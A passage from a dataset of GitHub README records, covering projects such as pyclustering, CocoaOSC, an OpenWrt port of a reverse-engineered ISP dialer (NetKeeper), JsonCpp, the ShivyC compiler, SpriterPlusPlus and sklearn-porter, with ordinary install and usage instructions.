cluster_visualizer()\n    visualizer.append_clusters(clusters, stimulus)\n    visualizer.show()\n\n\n\nIllustrations\n=============\n\n**Cluster allocation on FCPS dataset collection by DBSCAN:**\n\n.. image:: https://github.com/annoviko/pyclustering/blob/master/docs/img/fcps_cluster_analysis.png\n   :alt: Clustering by DBSCAN\n\n**Cluster allocation by OPTICS using cluster-ordering diagram:**\n\n.. image:: https://github.com/annoviko/pyclustering/blob/master/docs/img/optics_example_clustering.png\n   :alt: Clustering by OPTICS\n\n\n**Partial synchronization (clustering) in Sync oscillatory network:**\n\n.. image:: https://github.com/annoviko/pyclustering/blob/master/docs/img/sync_partial_synchronization.png\n   :alt: Partial synchronization in Sync oscillatory network\n\n\n**Cluster visualization by SOM (Self-Organized Feature Map)**\n\n.. image:: https://github.com/annoviko/pyclustering/blob/master/docs/img/target_som_processing.png\n   :alt: Cluster visualization by SOM\n\n\n\n.. _scikit-learn: https://scikit-learn.org/stable/\n.. _ELKI: https://elki-project.github.io/\n\n.. |Build Status Linux MacOS| image:: https://travis-ci.org/annoviko/pyclustering.svg?branch=master\n   :target: https://travis-ci.org/annoviko/pyclustering\n.. |Build Status Win| image:: https://ci.appveyor.com/api/projects/status/4uly2exfp49emwn0/branch/master?svg=true\n   :target: https://ci.appveyor.com/project/annoviko/pyclustering/branch/master\n.. |Coverage Status| image:: https://coveralls.io/repos/github/annoviko/pyclustering/badge.svg?branch=master&ts=1\n   :target: https://coveralls.io/github/annoviko/pyclustering?branch=master\n.. |Documentation| image:: https://codedocs.xyz/annoviko/pyclustering.svg\n   :target: https://codedocs.xyz/annoviko/pyclustering/\n.. |DOI| image:: https://zenodo.org/badge/DOI/10.5281/zenodo.1491324.svg\n   :target: https://doi.org/10.5281/zenodo.1491324\n.. |PyPi| image:: https://badge.fury.io/py/pyclustering.svg\n   :target: https://badge.fury.io/py/pyclustering\n.. |Build Status Linux MacOS 0.9.dev| image:: https://travis-ci.org/annoviko/pyclustering.svg?branch=0.9.dev\n   :target: https://travis-ci.org/annoviko/pyclustering\n.. |Build Status Win 0.9.dev| image:: https://ci.appveyor.com/api/projects/status/4uly2exfp49emwn0/branch/0.9.dev?svg=true\n   :target: https://ci.appveyor.com/project/annoviko/pyclustering/branch/0.9.dev\n.. |Coverage Status 0.9.dev| image:: https://coveralls.io/repos/github/annoviko/pyclustering/badge.svg?branch=0.9.dev&ts=1\n   :target: https://coveralls.io/github/annoviko/pyclustering?branch=0.9.dev\n.. |Build Status Linux 0.9.2.rel| image:: https://travis-ci.org/annoviko/pyclustering.svg?branch=0.9.2.rel\n   :target: https://travis-ci.org/annoviko/pyclustering\n.. |Build Status Win 0.9.2.rel| image:: https://ci.appveyor.com/api/projects/status/4uly2exfp49emwn0/branch/0.9.2.rel?svg=true\n   :target: https://ci.appveyor.com/project/annoviko/pyclustering/branch/0.9.2.rel\n.. |Coverage Status 0.9.2.rel| image:: https://coveralls.io/repos/github/annoviko/pyclustering/badge.svg?branch=0.9.2.rel&ts=1\n   :target: https://coveralls.io/github/annoviko/pyclustering?branch=0.9.2.rel\n.. |Download Counter| image:: https://pepy.tech/badge/pyclustering\n   :target: https://pepy.tech/project/pyclustering\n.. |JOSS| image:: http://joss.theoj.org/papers/10.21105/joss.01230/status.svg\n   :target: https://doi.org/10.21105/joss.01230"}, {"repo": "/danieldickison/CocoaOSC", "language": "HTML", "readme_contents": "CocoaOSC\n========\n\nThis is an Objective-C library for sending and receiving [Open Sound Control 1.0][osc] (OSC) messages over UDP or TCP.  The purpose of OSC was originally to be a modern replacement for the MIDI protocol in electronic music contexts, but it is also useful outside of music for providing a simple and way of serializing and routing arbitrary messages between multiple processes.\n\nPlease consider this library a work in progress.  In particular, OSC bundles are currently not supported.\n\n[osc]: http://opensoundcontrol.org/spec-1_0\n\nLicense\n-------\n\nCopyright (c) 2012, Daniel Dickison\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"}, {"repo": "/miao1007/Openwrt-NetKeeper", "language": "C++", "readme_contents": "# Openwrt-NetKeeper \u95ea\u8baf\u62e8\u53f7for OpenWrt\n\n\n### \u7b80\u8ff0\n\n\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8eOpenWRT\u7684\u95ea\u8baf\u62e8\u53f7\u7b97\u6cd5\u7684\u5b9e\u73b0\u3002\u901a\u8fc7\u5bf9Android\u7248\u7684\u53cd\u7f16\u8bd1\uff0c\u83b7\u5f97\u5230\u4e86\u62e8\u53f7\u6d41\u7a0b\uff0c\u5e76\u628a\u5b83\u79fb\u690d\u5230OpenWRT\u4e0a\u8fd0\u884c\uff0c~~\u5b9e\u73b0\u6253\u7834\u6bd2\u7624\u7535\u4fe1\u5784\u65ad\u7684\u6548\u679c~~\u3002\n\n\u8bba\u575b\u89c1[\u8fd9\u91cc](http://www.right.com.cn/forum/thread-141979-1-1.html)\n\n~~QQ\u7fa4\u5728\u8fd9\u91cc495772016~~\n\n\n\u5fc3\u8df3\u5df2\u7ecf\u901a\u8fc7Android\u7248\u53cd\u7f16\u8bd1\u51fa\u6765\u4e86\uff0c\u4e0d\u8fc7\u5e94\u8be5\u662f\u70c2\u5c3e\u4e86\uff0c\u627e\u5de5\u4f5c\u6ca1\u65f6\u95f4\u79fb\u690d\u4e86\uff08\u7528\u811a\u672c\u8bed\u8a00\u53d1\u5957\u63a5\u5b57\u5c31\u53ef\u4ee5\uff09.... <https://github.com/miao1007/android-netkeeper>\n\n\n### \u5de5\u4f5c\u539f\u7406\n![How does it work](mdassets/hownetkeeperwork.png)\n\n### \u652f\u6301\u5730\u533a\n1. \u6b66\u6c49E\u4fe1\n2. \u91cd\u5e86\n3. \u676d\u5dde\n4. \u5357\u660c(V18~V32)\n5. \u6d77\u5357\n6. \u9752\u6d77/\u65b0\u7586\n7. \u6cb3\u5317\n8. \u5c71\u4e1c\u79fb\u52a8\n\n\u67e5\u770b\u66f4\u591a\uff1a [supported radius](https://github.com/miao1007/Openwrt-NetKeeper/blob/master/src/makefile#L10)\n\n### \u7279\u6027\n1. \u7b97\u6cd5\u975e\u5e38\u6709\u6548\u7387\uff0c\u57fa\u4e8e\u4f4d\u8fd0\u884c\u4f18\u5316\uff0c\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e5f\u80fd\u8f7b\u677e\u8fd0\u884c\uff1b\n2. \u53ef\u79fb\u690d\u5f3a\uff0c\u4ec5\u6709\u7684\u51e0\u4e2a\u5e93\u6587\u4ef6\u5728\u4efb\u4f55\u8bbe\u5907\u5747\u53ef\u4f7f\u7528\uff1b\n3. \u81ea\u9002\u5e94\u5e10\u53f7\u957f\u5ea6\uff0c\u652f\u6301\u5e26\u540e\u7f00\u4e0e\u4e0d\u5e26\u540e\u7f00\u7684\u8fd0\u7b97\uff1b\n4. \u652f\u6301\u539f\u5382OpenWrt\u3001PandoraBox\uff08\u4f46\u5e76\u4e0d\u63a8\u8350\uff09\u3002\n\n\n## \u5982\u4f55\u4f7f\u7528\n\n\n#### 1. \u4e0b\u8f7d\u6700\u65b0\u7248\u63d2\u4ef6\n\n1. [sxplugin.so](https://github.com/miao1007/Openwrt-NetKeeper/releases)\n2. [confnetwork.sh](https://github.com/miao1007/Openwrt-NetKeeper/blob/master/src/confnetwork.sh)\n \n\u4e0b\u8f7d\u540e\uff0c\u4fee\u6539`confnetwork.sh`\u4e2d\u7684 `pppd_options` `username ` `password ` \n\n\n\n#### 2. \u4e0a\u4f20\n\u4f7f\u7528scp(windows\u4e0b\u53ef\u4ee5\u4f7f\u7528 [WinScp](https://winscp.net/download/winscp576.zip)) \u4e0a\u4f20\n\n```\nyourprovince_sxplugin.so -> /usr/lib/pppd/2.4.7/\nconfnetwork.sh -> /tmp/\n```\n\n#### 3. \u914d\u7f6e\u8def\u7531\u5668\n\u767b\u9646\u8def\u7531\u5668\uff0c\u6267\u884c\u811a\u672c\n\n```\nchmod a+x /tmp/confnetwork.sh\nsh /tmp/confnetwork.sh \n```\n\n\u6700\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u540c\u6b65\u4e00\u4e0b\u8def\u7531\u5668\u65f6\u95f4\u5e76\u91cd\u8fde\u4e00\u4e0b\u95ea\u8baf(netkeeper)\n\n\n\n\n## \u5f00\u53d1\n\u4ee5\u4e0b\u9700\u8981\u4e86\u89e3\u5f00\u53d1\u76f8\u5173\u6280\u672f\n\n### 1. \u7528\u6e90\u7801\u8fdb\u884c\u7f16\u8bd1\n\n\u9996\u5148\u4f60\u8981\u51c6\u5907\u4e00\u4e2aUbuntu\u7684\u865a\u62df\u673a(recommend [14.04](http://releases.ubuntu.com/14.04/)) \u4f5c\u4e3a\u5f00\u53d1\u4f9d\u8d56\n\n#### 1.1. \u514b\u9686\u4ee3\u7801\n\n```\ngit clone --depth=1 https://github.com/miao1007/Openwrt-NetKeeper.git\n```\n\n#### 1.2. \u4e0b\u8f7dToolchain\n\n\u76f4\u63a5\u4e0b\u8f7d\u6700\u65b0\u7684[Toolchain](https://github.com/miao1007/Openwrt-NetKeeper/wiki#2-%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BDgcc)\n\t\n\u6216\u8005\u7528\u547d\u4ee4\u4e0b\u8f7d\n\t\n```\n#this is a sample for mipsel(Little Endian) device\nwget https://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/OpenWrt-Toolchain-ramips-for-mipsel_24kec%2bdsp-gcc-4.8-linaro_uClibc-0.9.33.2.tar.bz2 | tar -xjf \n```\n\n#### 1.3. \u914d\u7f6e\n\n\u4ed4\u7ec6\u9605\u8bfb `makefile` \u4e0e `confnetwork.sh` \u4e2d\u7684 **TODO**\n\n#### 1.4. \u7f16\u8bd1\n\t\n\n```\ncd Openwrt-NetKeeper/src/\nmake all\n```\n\n### 2. \u914d\u7f6e\u8def\u7531\u5668\n\n\u4f7f\u7528\u6b64\u811a\u672c\u81ea\u52a8\u914d\u7f6e\u8def\u7531\u5668\n\n```\nmake upload\n```\n\n## \u7591\u96be\u95ee\u9898\n\n1. \u8bf7\u5148\u5728[wiki](https://github.com/miao1007/Openwrt-NetKeeper/wiki)\u4e2d\u67e5\u627e\u7b54\u6848\n2. \u63d0\u4ea4\u65b0\u7684[issue](https://github.com/miao1007/Openwrt-NetKeeper/issues/new) \uff08\u8bf7\u9644\u4e0a\u7cfb\u7edf\u65e5\u5fd7\uff09\n\n\n## \u611f\u8c22\n* [NETKEEPER ON WINDOWS](http://www.purpleroc.com/html/507231.html)\n* [CQUPT NETKEEPER](http://bbs.cqupt.edu.cn/nForum/#!article/Unix_Linux/13624)\n* <https://sunflyer.cn/archives/239>\n\n## \u4f5c\u8005\nLeon - <miao1007@gmail.com>\n\n\n## License\n\n1. GPL\n2. \u52ff\u505a**TAOBAO**\u7528\u9014\n"}, {"repo": "/kennethreitz/context", "language": "HTML", "readme_contents": "error: no README"}, {"repo": "/tencent-wechat/libco", "language": "C++", "readme_contents": "\u672c\u5e93\u5df2\u8f6c\u81f3 <a>http://github.com/Tencent/libco</a>\n"}, {"repo": "/open-source-parsers/jsoncpp", "language": "C++", "readme_contents": "# JsonCpp\n\n[![badge](https://img.shields.io/badge/conan.io-jsoncpp%2F1.8.0-green.svg?logo=data:image/png;base64%2CiVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAA1VBMVEUAAABhlctjlstkl8tlmMtlmMxlmcxmmcxnmsxpnMxpnM1qnc1sn85voM91oM11oc1xotB2oc56pNF6pNJ2ptJ8ptJ8ptN9ptN8p9N5qNJ9p9N9p9R8qtOBqdSAqtOAqtR%2BrNSCrNJ/rdWDrNWCsNWCsNaJs9eLs9iRvNuVvdyVv9yXwd2Zwt6axN6dxt%2Bfx%2BChyeGiyuGjyuCjyuGly%2BGlzOKmzOGozuKoz%2BKqz%2BOq0OOv1OWw1OWw1eWx1eWy1uay1%2Baz1%2Baz1%2Bez2Oe02Oe12ee22ujUGwH3AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfgBQkREyOxFIh/AAAAiklEQVQI12NgAAMbOwY4sLZ2NtQ1coVKWNvoc/Eq8XDr2wB5Ig62ekza9vaOqpK2TpoMzOxaFtwqZua2Bm4makIM7OzMAjoaCqYuxooSUqJALjs7o4yVpbowvzSUy87KqSwmxQfnsrPISyFzWeWAXCkpMaBVIC4bmCsOdgiUKwh3JojLgAQ4ZCE0AMm2D29tZwe6AAAAAElFTkSuQmCC)](https://bintray.com/theirix/conan-repo/jsoncpp%3Atheirix)\n[![badge](https://img.shields.io/badge/license-MIT-blue)](https://github.com/open-source-parsers/jsoncpp/blob/master/LICENSE)\n[![badge](https://img.shields.io/badge/document-doxygen-brightgreen)](http://open-source-parsers.github.io/jsoncpp-docs/doxygen/index.html)\n[![Coverage Status](https://coveralls.io/repos/github/open-source-parsers/jsoncpp/badge.svg?branch=master)](https://coveralls.io/github/open-source-parsers/jsoncpp?branch=master)\n\n\n[JSON][json-org] is a lightweight data-interchange format. It can represent\nnumbers, strings, ordered sequences of values, and collections of name/value\npairs.\n\n[json-org]: http://json.org/\n\nJsonCpp is a C++ library that allows manipulating JSON values, including\nserialization and deserialization to and from strings. It can also preserve\nexisting comment in unserialization/serialization steps, making it a convenient\nformat to store user input files.\n\n\n## Documentation\n\n[JsonCpp documentation][JsonCpp-documentation] is generated using [Doxygen][].\n\n[JsonCpp-documentation]: http://open-source-parsers.github.io/jsoncpp-docs/doxygen/index.html\n[Doxygen]: http://www.doxygen.org\n\n\n## A note on backward-compatibility\n\n* `1.y.z` is built with C++11.\n* `0.y.z` can be used with older compilers.\n* Major versions maintain binary-compatibility.\n\n\n## Using JsonCpp in your project\n\n### The vcpkg dependency manager\nYou can download and install JsonCpp using the [vcpkg](https://github.com/Microsoft/vcpkg/) dependency manager:\n\n    git clone https://github.com/Microsoft/vcpkg.git\n    cd vcpkg\n    ./bootstrap-vcpkg.sh\n    ./vcpkg integrate install\n    vcpkg install jsoncpp\n\nThe JsonCpp port in vcpkg is kept up to date by Microsoft team members and community contributors. If the version is out of date, please [create an issue or pull request](https://github.com/Microsoft/vcpkg) on the vcpkg repository.\n\n### Amalgamated source\nhttps://github.com/open-source-parsers/jsoncpp/wiki/Amalgamated-(Possibly-outdated)\n\n### The Meson Build System\nIf you are using the [Meson Build System](http://mesonbuild.com), then you can get a wrap file by downloading it from [Meson WrapDB](https://wrapdb.mesonbuild.com/jsoncpp), or simply use `meson wrap install jsoncpp`.\n\n### Other ways\nIf you have trouble, see the [Wiki](https://github.com/open-source-parsers/jsoncpp/wiki), or post a question as an Issue.\n\n## License\n\nSee the `LICENSE` file for details. In summary, JsonCpp is licensed under the\nMIT license, or public domain if desired and recognized in your jurisdiction.\n"}, {"repo": "/ShivamSarodia/ShivyC", "language": "Python", "readme_contents": "# ShivyC [![Build Status](https://travis-ci.org/ShivamSarodia/ShivyC.svg?branch=master)](https://travis-ci.org/ShivamSarodia/ShivyC) [![Code Coverage](https://codecov.io/gh/ShivamSarodia/ShivyC/branch/master/graph/badge.svg)](https://codecov.io/gh/ShivamSarodia/ShivyC)\n\n### A hobby C compiler created in Python.\n\n![ShivyC demo GIF.](https://raw.githubusercontent.com/ShivamSarodia/ShivyC/master/demo.gif)\n\n---\n\nShivyC is a hobby C compiler written in Python 3 that supports a subset of the C11 standard and generates reasonably efficient binaries, including some optimizations. ShivyC also generates helpful compile-time error messages.\n\nThis [implementation of a trie](tests/general_tests/trie/trie.c) is an example of what ShivyC can compile today. For a more comprehensive list of features, see the [feature test directory](tests/feature_tests).\n\n## Quickstart\n\n### x86-64 Linux\nShivyC requires only Python 3.6 or later to compile C code. Assembling and linking are done using the GNU binutils and glibc, which you almost certainly already have installed.\n\nTo install ShivyC:\n```\npip3 install shivyc\n```\nTo create, compile, and run an example program:\n```c\n$ vim hello.c\n$ cat hello.c\n\n#include <stdio.h>\nint main() {\n  printf(\"hello, world!\\n\");\n}\n\n$ shivyc hello.c\n$ ./out\nhello, world!\n```\nTo run the tests:\n```\ngit clone https://github.com/ShivamSarodia/ShivyC.git\ncd ShivyC\npython3 -m unittest discover\n```\n\n### Other Architectures\nFor the convenience of those not running Linux, the [`docker/`](docker/) directory provides a Dockerfile that sets up an x86-64 Linux Ubuntu environment with everything necessary for ShivyC. To use this, run:\n```\ngit clone https://github.com/ShivamSarodia/ShivyC.git\ncd ShivyC\ndocker build -t shivyc docker/\ndocker/shell\n```\nThis will open up a shell in an environment with ShivyC installed and ready to use with\n```\nshivyc any_c_file.c           # to compile a file\npython3 -m unittest discover  # to run tests\n```\nThe Docker ShivyC executable will update live with any changes made in your local ShivyC directory.\n\n## Implementation Overview\n#### Preprocessor\nShivyC today has a very limited preprocessor that parses out comments and expands `#include` directives. These features are implemented between [`lexer.py`](shivyc/lexer.py) and [`preproc.py`](shivyc/lexer.py).\n\n#### Lexer\nThe ShivyC lexer is implemented primarily in [`lexer.py`](shivyc/lexer.py). Additionally, [`tokens.py`](shivyc/tokens.py) contains definitions of the token classes used in the lexer and [`token_kinds.py`](shivyc/token_kinds.py) contains instances of recognized keyword and symbol tokens.\n\n#### Parser\nThe ShivyC parser uses recursive descent techniques for all parsing. It is implented in [`parser/*.py`](shivyc/parser/) and creates a parse tree of nodes defined in [`tree/nodes.py`](shivyc/tree/nodes.py) and [`tree/expr_nodes.py`](shivyc/tree/expr_nodes.py).\n\n#### IL generation\nShivyC traverses the parse tree to generate a flat custom IL (intermediate language). The commands for this IL are in [`il_cmds/*.py`](shivyc/il_cmds/) . Objects used for IL generation are in [`il_gen.py`](shivyc/il_gen.py) , but most of the IL generating code is in the `make_code` function of each tree node in [`tree/*.py`](shivyc/tree/).\n\n#### ASM generation\nShivyC sequentially reads the IL commands, converting each into Intel-format x86-64 assembly code. ShivyC performs register allocation using George and Appel\u2019s iterated register coalescing algorithm (see References below). The general ASM generation functionality is in [`asm_gen.py`](shivyc/asm_gen.py) , but much of the ASM generating code is in the `make_asm` function of each IL command in [`il_cmds/*.py`](shivyc/il_cmds/).\n\n## Contributing\nPull requests to ShivyC are very welcome. A good place to start is the [Issues page](https://github.com/ShivamSarodia/ShivyC/issues). All [issues labeled \"feature\"](https://github.com/ShivamSarodia/ShivyC/issues?q=is%3Aopen+is%3Aissue+label%3Afeature) are TODO tasks. [Issues labeled \"bug\"](https://github.com/ShivamSarodia/ShivyC/issues?q=is%3Aopen+is%3Aissue+label%3Abug) are individual miscompilations in ShivyC. If you have any questions, please feel free to ask in the comments of the relevant issue or create a new issue labeled \"question\". Of course, please add test(s) for all new functionality.\n\nMany thanks to our current and past contributers:\n* [ShivamSarodia](https://github.com/ShivamSarodia)\n* [cclauss](https://github.com/cclauss)\n* [TBladen](https://github.com/tbladen)\n* [christian-stephen](https://github.com/christian-stephen)\n* [jubnzv](https://github.com/jubnzv)\n* [eriols](https://github.com/eriols)\n\n## References\n- [ShivC](https://github.com/ShivamSarodia/ShivC) - ShivyC is a rewrite from scratch of my old C compiler, ShivC, with much more emphasis on feature completeness and code quality. See the ShivC README for more details.\n- C11 Specification - http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\n- x86_64 ABI - https://github.com/hjl-tools/x86-psABI/wiki/x86-64-psABI-1.0.pdf\n- Iterated Register Coalescing (George and Appel) - https://www.cs.purdue.edu/homes/hosking/502/george.pdf\n"}, {"repo": "/lucidspriter/SpriterPlusPlus", "language": "HTML", "readme_contents": "# SpriterPlusPlus\na C++ Implementation for Spriter animations\n\n## About\nSpriterPlusPlus aims to be as quick as possible playing back animations, and iterating additional characters once loaded.\nAdditional instances are flyweights that take up less ram than the initially the loaded model.\nEach flyweight instance minimizes cycles spent in random access and iteratating through containers using stored pointers and iterators wherever possible.\n\n## Included example\nSfml for display and sound playback\n\nTwo examples for loading: TinyXml and PugiXml\n\n## Supported Features\nBasic animations\nBone animations\nAll curve types (Instant, Linear, Quadratic, Cubic, Quartic, Quintic, Bezier)\nPoints\nCollision Rectangles\nSubEntities\nEvents (Triggers)\nSounds\nVariables\nTags\nCharacter Maps\nAnimation Blending\n\n## How to use\n\n##### All necessary files are in the 'spriterengine' folder.  The other included files are for example purposes.\n\n### Extend (All of the following can be found in spriterengine/override) :\n#### FileFactory \n###### and pass to SpriterModel so it can use your own inherited versions of :\n* SpriterFileDocumentWrapper (and Element and Attribute Wrappers) to create parsing code.  You can specify a separate SpriterFileDocumentWrapper for scml (xml) and scon (json), which will be automatically selected upon loading based on the file extension\n* ImageFile to store shared texture/image resources to be used by sprite objects\n* SoundFile to store shared sound resources to be used by sound objects, and create your custom extended version of SoundObjectInfoReference to playback and control volume of the shared sound resources\n\n#### ObjectFactory \n###### and pass to SpriterModel to enable debug rendering:\n* spriterengine/objectinfo/PointInstanceInfo \n* spriterengine/objectinfo/BoneInstanceInfo\n* spriterengine/objectinfo/BoxInstanceInfo \n \nSettings.cpp has static variables to control the display of points, bones, and boxes:\n\n* bool Settings::renderDebugPoints;\n* bool Settings::renderDebugBones;\n* bool Settings::renderDebugBoxes;\n\nenableDebugBones must be true while creating a new instance in order for renderDebugBones to have an effect:\n* bool Settings::enableDebugBones;\n\n* spriterengine/objectinfo/TriggerObjectInfo if you want to be able to perform a function upon being triggering events\n###### (Alternatively you can query a specific trigger for your instance using :\n* getTriggerObject(\"triggerName\")->getTriggerCount() // in case more than one event was triggered in the elapsed time\n\n\n\n\n### Creating an instance :\n* #include \"spriterengine/spriterengine.h\"\n* ScmlModel scmlModel(fileName, new customFileFactory, new customObjectFactory/*optional*/);\n\n* EntityInstance *entityInstance = scmlModel.getNewEntityInstance(entityName or entityIndex);\n\n\n### Controlling playback :\n* entityInstance->setCurrentAnimation(animationName); // defaults to first animation\n* entityInstance->setCurrentAnimation(animationName, blendTimeInMilliseconds); // blends the current animation to the new one over time\n* entityInstance->setTimeElapsed(inMilliseconds); \n\n* entityInstance->pausePlayback(); // playback is automatically paused at the end of a non-looping animation\n* entityInstance->startResumePlayback(); // playback automatically resumes on a setCurrentAnimation() command\n\n\n##### after setting the elapsed Time:\n* entityInstance->render();\n\n##### and if you're using sound and/or events:\n* entityInstance->playSoundTriggers();\n\n###### or\n\n* entityInstance->playEventTriggers();\n\n###### or\n\n* entityInstance->playAllTriggers();\n\n\n\n#### Controlling the entire character\n* entityInstance->setPosition(SpriterEngine::point(x,y))\n* entityInstance->setAngle(SpriterEngine::toRadians(angle));\n* entityInstance->setScale(SpriterEngine::point(w,h));\n\n\n#### Character Maps\n* entityInstance->applyCharacterMap(\"charMapOne\");\n* entityInstance->applyCharacterMap(\"charMapTwo\");\n* entityInstance->removeCharacterMap(\"charMapOne\");\n* entityInstance->removeAllCharacterMaps();\n\n\n#### Metadata\n##### to retrieve a variable value from an object :\n* entityInstance->getRealValue(\"objectName\",\"varName\"); // or getIntValue, or getStringValue\n\n##### to retrieve a variable from the entity itself :\n* entityInstance->getRealValue(\"varName\"); // or getIntValue, or getStringValue\n\n##### if you would like to store the variable to avoid repeated retrieval for performance reasons (should normally not be necessary):\n* UniversalObjectInterface *myVariable = entityInstance->getVariable(\"objectName\", \"varName\"); // to retrieve from an object or\n* UniversalObjectInterface *myVariable = entityInstance->getVariable(\"varName\"); // to retrieve from the entity itself\n \n######      and then use\n\n* myVariable->getRealValue(); // or getIntValue, or getStringValue\n\n\n##### to check if a tag is active :\n* bool myTagIsActive = entityInstance->tagIsActive(\"objectName\", \"tagName\");\n\n##### or if the tag is on the entity itself :\n* bool myTagIsActive = entityInstance->tagIsActive(\"tagName\");\n\n\n### Additional options\n#### Error output\nIn Settings.cpp there is a function pointer to a callback function to display error messages:\n* ErrorFunctionPointer Settings::errFunction; \n\nAny function with the signature void myErrorFunction(const std::string &errorMessage) can be used here. \n\nTwo basic error functions are provided:\n* nullError is the default, and takes no action\n* simpleError outputs the error message to std::cerr\n\nIn most cases, there should be no errors, unless you are loading an invalid file, attempting to retrieve the wrong type of data from an object or variable (myStringVariable->getIntValue()), or attempting to access a missing variable or object\n\n\n\t\n\n#### Loading options\nIn Settings.cpp you can set loading option, if your engine requires the y, pivotY, or angle to be reversed to display properly (you attempt to load a character in your engine and the positions, pivots, or angles seem reversed).\nThese are all defaulted to true, which is the setting that should work correctly for most engines.\n\n*\tSettings::reverseYOnLoad;\n*\tSettings::reversePivotYOnLoad;\n*\tSettings::reverseAngleOnLoad;\n\n\n## Feedback\nTo provide feedback, report errors, or give suggestions, please use the relevant Spriter [forum thread](http://brashmonkey.com/forum/index.php?/topic/4464-spriterplusplus-a-c-spriter-implementation/ \"BrashMonkey forums\").\n"}, {"repo": "/nok/sklearn-porter", "language": "Python", "readme_contents": "\n# sklearn-porter\n\n[![GitHub license](https://img.shields.io/pypi/l/sklearn-porter.svg)](https://raw.githubusercontent.com/nok/sklearn-porter/master/license.txt)\n[![Stack Overflow](https://img.shields.io/badge/stack%20overflow-ask%20questions-blue.svg)](https://stackoverflow.com/questions/tagged/sklearn-porter)\n[![Join the chat at https://gitter.im/nok/sklearn-porter](https://badges.gitter.im/nok/sklearn-porter.svg)](https://gitter.im/nok/sklearn-porter?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![Twitter](https://img.shields.io/twitter/follow/darius_morawiec.svg?label=follow&style=popout)](https://twitter.com/darius_morawiec)\n\nTranspile trained [scikit-learn](https://github.com/scikit-learn/scikit-learn) estimators to C, Java, JavaScript and others.<br>It's recommended for limited embedded systems and critical applications where performance matters most.\n\n\n## Important\n\nWe're hard working on the [first major release](https://github.com/nok/sklearn-porter/tree/release/1.0.0) of sklearn-porter. <br>Until that we will just release bugfixes to the stable version.\n\n\n## Estimators\n\n<table>\n    <tbody>\n        <tr>\n            <td align=\"center\" width=\"32%\"><strong>Estimator</strong></td>\n            <td align=\"center\" colspan=\"6\" width=\"68%\"><strong>Programming language</strong></td>\n        </tr>\n        <tr>\n            <td align=\"left\" width=\"32%\">Classifier</td>\n            <td align=\"center\" width=\"13%\">Java *</td>\n            <td align=\"center\" width=\"11%\">JS</td>\n            <td align=\"center\" width=\"11%\">C</td>\n            <td align=\"center\" width=\"11%\">Go</td>\n            <td align=\"center\" width=\"11%\">PHP</td>\n            <td align=\"center\" width=\"11%\">Ruby</td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.svm.SVC.html\">svm.SVC</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/SVC/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/SVC/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/SVC/js/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/SVC/c/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/SVC/php/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/SVC/ruby/basics.pct.ipynb\">\u2713</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.svm.NuSVC.html\">svm.NuSVC</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/NuSVC/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/NuSVC/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/NuSVC/js/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/NuSVC/c/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/NuSVC/php/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/NuSVC/ruby/basics.pct.ipynb\">\u2713</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.svm.LinearSVC.html\">svm.LinearSVC</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/LinearSVC/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/js/basics.pct.ipynb\">\u2713</a></td>\n            <td 